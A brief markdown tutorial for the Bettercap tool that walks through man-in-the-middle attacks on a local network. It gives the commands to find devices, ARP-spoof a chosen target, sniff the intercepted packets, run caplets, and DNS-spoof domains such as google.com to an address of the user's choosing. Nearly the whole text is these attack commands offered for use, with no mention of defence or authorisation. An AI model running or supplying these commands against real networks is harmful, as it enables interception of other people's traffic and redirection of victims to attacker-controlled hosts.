# Bettercap Tutorial

## <ins>commands</ins>

1) run the tool  
```
bettercap -iface <my_interface>
```

2) discover devices on your network  
first we need to enable probe
```
net.probe on
```
after that you can run  
```
net.show
```
3) arpspoof with bettercap  
```
set arp.spoof.fullduplex true
set arp.spoof.targets <target ip> 
arp.spoof on
```
now you can use sniffer to see packets, i am using the bettercap one  
```
set net.sniff.local true
net.sniff on
```
4) list caplets  
```
caplets.show
```
to run caplet just write its name.  

5) dns spoof using bettercap
### <ins>you have to arp-spoof before doing this, and does not work on browsers using hsts</ins>
```
set dns.spoof.address <ip_to_point_to>
set dns.spoof.all true
set dns.spoof.domains <domains_name_to_spoof>
```
(example dns.spoof.domains google.com, *.google.com --> * for sub domains)
```
dns.spoof on
```